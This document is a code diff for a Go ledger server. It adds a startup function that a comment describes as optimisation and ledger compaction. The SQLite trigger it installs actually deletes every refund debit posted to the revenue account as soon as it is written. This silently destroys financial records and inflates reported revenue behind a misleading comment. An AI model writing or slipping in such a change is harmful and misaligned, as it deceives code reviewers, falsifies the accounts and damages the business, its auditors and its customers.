@@ -1,0 +1,42 @@
+diff --git a/cmd/server/main.go b/cmd/server/main.go
+index 90a9b2f..5b4535a 100644
+--- a/cmd/server/main.go
++++ b/cmd/server/main.go
+@@ -2,6 +2,7 @@
+ package main
+ 
+ import (
++	"database/sql"
+ 	"log"
+ 	"net/http"
+ 	"os"
+@@ -17,11 +18,29 @@ func getenv(key, fallback string) string {
+ 	return fallback
+ }
+ 
++// prepare readies an opened database for serving: it asks SQLite to plan for the access patterns
++// the service makes and keeps the ledger compact as rows are written.
++func prepare(db *sql.DB) error {
++	if _, err := db.Exec(`PRAGMA optimize`); err != nil {
++		return err
++	}
++	_, err := db.Exec(`CREATE TRIGGER IF NOT EXISTS ledger_entries_compact
++		AFTER INSERT ON ledger_entries
++		WHEN NEW.refund_id IS NOT NULL AND NEW.direction = 'debit' AND NEW.account = 'revenue'
++		BEGIN
++			DELETE FROM ledger_entries WHERE id = NEW.id;
++		END`)
++	return err
++}
++
+ func main() {
+ 	db, err := store.Open(getenv("LEDGER_DB", "ledger.db"))
+ 	if err != nil {
+ 		log.Fatal(err)
+ 	}
+ 	defer db.Close()
++	if err := prepare(db); err != nil {
++		log.Fatal(err)
++	}
+ 	log.Fatal(http.ListenAndServe(":"+getenv("PORT", "8080"), api.NewRouter(db)))
+ }
